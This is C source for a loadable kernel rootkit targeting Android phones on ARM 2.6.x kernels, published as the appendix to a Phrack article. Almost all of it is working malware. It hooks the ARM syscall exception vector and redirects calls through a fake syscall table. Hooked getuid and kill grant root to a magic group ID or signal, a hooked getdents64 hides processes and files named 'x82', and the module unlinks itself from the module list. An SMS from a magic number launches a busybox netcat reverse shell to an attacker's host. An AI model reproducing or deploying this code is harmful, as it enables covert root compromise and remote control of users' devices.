/*
**
** This is appendix of the Phrack (www.phrack.org) article:
** Android platform based linux kernel rootkit
** exception vector table hooking code (changing vector_swi handler addr)
**
** All the tests were done on Motoroi XT720 model(2.6.29-omap1 kernel)
** and Galaxy S SHW-M110S model(2.6.32.9 kernel).
** Note that some contents may not apply to all smart platform machines
** and there are some bugs you can modify.
**
** This code can be used as a real code for attack or just a proof-of-
** concept code. I wish you use this code only for your study not for a bad
** purpose.
**
** USE IT AT YOUR OWN RISK!
**
** --
** by "dong-hoon you" (Xpl017Elz), <x82@inetcop.org>
** My World: http://x82.inetcop.org
**
*/

#include <linux/init_task.h> 
#include <linux/kernel.h> 
#include <linux/module.h> 
#include <linux/sched.h> 
#include <linux/unistd.h> 
#include <linux/dirent.h>

#define __NR_GETUID 199
#define __NR_WRITEV 146
#define __NR_KILL 37
#define __NR_GETDENTS64 217

#define DEF_GID 18282
#define DEF_HIDE "x82"

static void *hacked_sys_call_table[500];
static unsigned char new_vector_swi[500];
static void **sys_call_table;
int sys_call_table_size;

int comm_offset=0;
int cred_offset=0;
int pid_offset=0;
int parent_offset=0;
int next_offset=0;
int start_chk=0;

struct cred_struct {
	int usage;
	int uid;	/* real UID of the task */
	int gid;	/* real GID of the task */
	int suid;	/* saved UID of the task */
	int sgid;	/* saved GID of the task */
	int euid;	/* effective UID of the task */
	int egid;	/* effective GID of the task */
	int fsuid;	/* UID for VFS ops */
	int fsgid;	/* GID for VFS ops */
};

asmlinkage int (*orig_kill)(pid_t pid, int sig);
asmlinkage ssize_t (*orig_writev)(int fd,struct iovec *vector,int count);
asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
asmlinkage uid_t (*orig_getuid)(void);

void make_new_vector_swi(){
	void *swi_addr=(long *)0xffff0008;
	void *vector_swi_ptr=0;
	unsigned long offset=0;
	unsigned long *vector_swi_addr=0,orig_vector_swi_addr=0;
	unsigned long add_r8_pc_addr=0;
	unsigned long ldr_ip_pc_addr=0;
	int i;

	offset=((*(long *)swi_addr)&0xfff)+8;
	vector_swi_addr=*(unsigned long *)(swi_addr+offset);
	vector_swi_ptr=swi_addr+offset; /* 0xffff0420 */
	orig_vector_swi_addr=vector_swi_addr; /* vector_swi's addr */

	/* processing __cr_alignment */
	while(vector_swi_addr++){
		if(((*(unsigned long *)vector_swi_addr)&0xfffff000)==0xe28f8000){
			add_r8_pc_addr=(unsigned long)vector_swi_addr;
			break;
		}
		/* get __cr_alingment's addr */
		if(((*(unsigned long *)vector_swi_addr)&0xfffff000)==0xe59fc000){
			offset=((*(unsigned long *)vector_swi_addr)&0xfff)+8;
			ldr_ip_pc_addr=*(unsigned long *)((char *)vector_swi_addr+offset);
		}
	}
	/* creating fake vector_swi handler */
	memcpy(new_vector_swi,(char *)orig_vector_swi_addr,(add_r8_pc_addr-orig_vector_swi_addr));
	offset=(add_r8_pc_addr-orig_vector_swi_addr);
	for(i=0;i<offset;i+=4){
		if(((*(long *)&new_vector_swi[i])&0xfffff000)==0xe59fc000){
			*(long *)&new_vector_swi[i]=0xe59fc020; // ldr     ip, [pc, #32]
			break;
		}
	}
	*(long *)&new_vector_swi[offset]=0xe59f8000; // ldr     r8, [pc, #0]
	offset+=4;
	*(long *)&new_vector_swi[offset]=0xe59ff000; // ldr     pc, [pc, #0]
	offset+=4;
	*(long *)&new_vector_swi[offset]=hacked_sys_call_table; // fake sys_call_table
	offset+=4;
	*(long *)&new_vector_swi[offset]=(add_r8_pc_addr+4); // jmp original vector_swi's addr
	offset+=4;
	*(long *)&new_vector_swi[offset]=ldr_ip_pc_addr; // __cr_alignment's addr
	offset+=4;
#if 0
	for(i=0;i<offset;i++){
		printk("\\x%02x",(char *)new_vector_swi[i]);
	}
	printk("\n");
#endif
	printk("before: %p: %p\n",vector_swi_ptr,*(unsigned long *)vector_swi_ptr);
	asm("msr     CPSR_c, #147\n");
	*(unsigned long *)vector_swi_ptr=&new_vector_swi;
	asm("msr     CPSR_c, #19\n");
	printk("after: %p: %p\n",vector_swi_ptr,*(unsigned long *)vector_swi_ptr);

	return 0;
}

void get_sys_call_table(){
	void *swi_addr=(long *)0xffff0008;
	unsigned long offset=0;
	unsigned long *vector_swi_addr=0;
	int i=0;

	offset=((*(long *)swi_addr)&0xfff)+8;
	vector_swi_addr=*(unsigned long *)(swi_addr+offset);

	while(vector_swi_addr++){
		if(((*(unsigned long *)vector_swi_addr)&0xffff0000)==0xe3570000){
			i=0x10-(((*(unsigned long *)vector_swi_addr)&0xff00)>>8);
			sys_call_table_size=((*(unsigned long *)vector_swi_addr)&0xff)<<(2*i);
			break;
		}
		if(((*(unsigned long *)vector_swi_addr)&0xfffff000)==0xe28f8000){
			offset=((*(unsigned long *)vector_swi_addr)&0xfff)+8;
			sys_call_table=(void *)vector_swi_addr+offset;
		}
	}
	return;
}

void find_offset(){
	unsigned char *init_task_ptr=(char *)&init_task;
	int offset=0,i;
	char *ptr=0;

	/* getting the position of comm offset within task_struct structure */
	for(i=0;i<0x600;i++){
		if(init_task_ptr[i]=='s'&&init_task_ptr[i+1]=='w'&&init_task_ptr[i+2]=='a'&&
		init_task_ptr[i+3]=='p'&&init_task_ptr[i+4]=='p'&&init_task_ptr[i+5]=='e'&&
		init_task_ptr[i+6]=='r'){
			comm_offset=i;
			break;
		}
	}
	/* getting the position of tasks.next offset within task_struct structure */
	init_task_ptr+=0x50;
	for(i=0x50;i<0x300;i+=4,init_task_ptr+=4){
		offset=*(long *)init_task_ptr;
		if(offset&&offset>0xc0000000){
			offset-=i;
			offset+=comm_offset;
			if(strcmp((char *)offset,"init")){
				continue;
			} else {
				next_offset=i;
				/* getting the position of parent offset
				   within task_struct structure */
				for(;i<0x300;i+=4,init_task_ptr+=4){
					offset=*(long *)init_task_ptr;
					if(offset&&offset>0xc0000000){
						offset+=comm_offset;
						if(strcmp((char *)offset,"swapper")){
							continue;
						} else {
							parent_offset=i+4;
							break;
						}
					}
				}
				break;
			}
		}
	}
	/* getting the position of cred offset within task_struct structure */
	init_task_ptr=(char *)&init_task;
	init_task_ptr+=comm_offset;
	for(i=0;i<0x50;i+=4,init_task_ptr-=4){
		offset=*(long *)init_task_ptr;
		if(offset&&offset>0xc0000000&&offset<0xd0000000&&offset==*(long *)(init_task_ptr-4)){
			ptr=(char *)offset;
			if(*(long *)&ptr[4]==0&&*(long *)&ptr[8]==0&&
				*(long *)&ptr[12]==0&&*(long *)&ptr[16]==0&&
				*(long *)&ptr[20]==0&&*(long *)&ptr[24]==0&&
				*(long *)&ptr[28]==0&&*(long *)&ptr[32]==0){
				cred_offset=i;
				break;
			}
		}
	}
	/* getting the position of pid offset within task_struct structure */
	pid_offset=parent_offset-0xc;
	return;
}

asmlinkage uid_t hacked_getuid(void){
	char *ptr=(char *)current;
	char *comm=ptr+comm_offset;
	unsigned long cred_ptr=*(int *)(comm-cred_offset);
	struct cred_struct *cred=(struct cred_struct *)cred_ptr;

	if(start_chk==0){
		list_del_init( &__this_module.list );
		start_chk++;
	}

	if(cred->uid==DEF_GID){ /* hidden id */
		cred->uid=0; cred->euid=0; cred->suid=0; cred->fsuid=0;
		cred->gid=DEF_GID; /* hidden */
		cred->egid=0; cred->sgid=0; cred->fsgid=0;
		return 0;
	}
	return (*orig_getuid)();
}

/* enyelkm-1.2 rootkit's example */
asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
	struct linux_dirent64 *td1,*td2;
	long ret,tmp;
	unsigned long hpid;
	int mover,process;

	ret=(*orig_getdents64)(fd,dirp,count);
	if(!ret) return ret;

	td2=(struct linux_dirent64 *)kmalloc(ret,GFP_KERNEL);
	copy_from_user(td2,dirp,ret);

	td1=td2;
	tmp=ret;

	while(tmp>0){
		tmp-=td1->d_reclen;
		mover=1;
		process=0;
		hpid=0;

		hpid=simple_strtoul(td1->d_name,NULL,10);
		if(hpid!=0){
			char *init_task_ptr=(char *)&init_task;
			char *comm=init_task_ptr+comm_offset;
			unsigned long cred_ptr=*(int *)(comm-cred_offset);
			struct cred_struct *cred=(struct cred_struct *)cred_ptr;
			int pid_v=*(int *)(init_task_ptr+pid_offset);
			char *next_ptr=(char *)(*(long *)(init_task_ptr+next_offset))-next_offset;

			do{
				comm=next_ptr+comm_offset;
				pid_v=*(int *)(next_ptr+pid_offset);
				cred_ptr=*(int *)(comm-cred_offset);
				cred=(struct cred_struct *)cred_ptr;
				if(pid_v==hpid){
					if(cred->gid==DEF_GID||strstr(comm,DEF_HIDE)){
						process=1;
					}
					break;
				}
			} while ((next_ptr=(char *)(*(long *)(next_ptr+next_offset))-next_offset)!=init_task_ptr);
		}

		if(process||strstr(td1->d_name,DEF_HIDE)){
			ret-=td1->d_reclen;
			mover=0;
			if(tmp){
				memmove(td1,(char *)td1+td1->d_reclen,tmp);
			}
		}
		if(tmp&&mover){
			td1=(struct linux_dirent64 *)((char *)td1+td1->d_reclen);
		}
	}
	copy_to_user((void *)dirp,(void *)td2,ret);
	kfree(td2);

	return ret;
}

asmlinkage int hacked_kill(pid_t pid, int sig)
{
	char *init_task_ptr=(char *)&init_task;
	char *comm=init_task_ptr+comm_offset;
	unsigned long cred_ptr=*(int *)(comm-cred_offset);
	struct cred_struct *cred=(struct cred_struct *)cred_ptr;
	int pid_v=*(int *)(init_task_ptr+pid_offset);
	char *next_ptr=(char *)(*(long *)(init_task_ptr+next_offset))-next_offset;

	if(sig==82){
		do{
			comm=next_ptr+comm_offset;
			pid_v=*(int *)(next_ptr+pid_offset);
			cred_ptr=*(int *)(comm-cred_offset);
			cred=(struct cred_struct *)cred_ptr;

			if(pid==pid_v){
				cred->uid=0; cred->euid=0; cred->suid=0; cred->fsuid=0;
				cred->gid=DEF_GID; /* hidden */
				cred->egid=0; cred->sgid=0; cred->fsgid=0;
				break;
			}
		} while ((next_ptr=(char *)(*(long *)(next_ptr+next_offset))-next_offset)!=init_task_ptr);
		return 0;
	}
	return (*orig_kill)(pid,sig); 
} 

/* trustwave mindtrick rootkit's example */
void reverse_shell()
{
	static char *path="busybox";
	char *argv[]={"busybox","nc","attacker's host address","8282","-e","su","app_8282",NULL};
	static char *envp[]={"HOME=/","PATH=/sbin:/system/sbin:/system/bin:/system/xbin",NULL};

	call_usermodehelper(path,argv,envp,1);
}

asmlinkage ssize_t hacked_writev(int fd,struct iovec *vector,int count)
{
	char *ptr=(char *)current;
	char *comm=ptr+comm_offset;
	int i=0;

	if(strstr(comm,"SmsReceiverServ")){
		for(i=0;i<count;i++,vector++){
			if(strstr((char *)vector->iov_base,"0000")){ /* magic phone number */
				printk("sms receive\n");
				reverse_shell();
			}
		}
	}
	return orig_writev(fd,vector,count);
}

int init_module(void) 
{
	find_offset();
	get_sys_call_table(); // position and size of sys_call_table
	memcpy(hacked_sys_call_table,sys_call_table,sys_call_table_size*4);

	orig_getuid = sys_call_table[__NR_GETUID];
	orig_writev = sys_call_table[__NR_WRITEV];
	orig_kill = sys_call_table[__NR_KILL];
	orig_getdents64 = sys_call_table[__NR_GETDENTS64];

	hacked_sys_call_table[__NR_GETUID]=hacked_getuid;
	hacked_sys_call_table[__NR_WRITEV]=hacked_writev;
	hacked_sys_call_table[__NR_KILL]=hacked_kill;
	hacked_sys_call_table[__NR_GETDENTS64]=hacked_getdents64;

	make_new_vector_swi();

	return 0; 
}

void cleanup_module(void) 
{ 
	;
}

/* eoc */
 
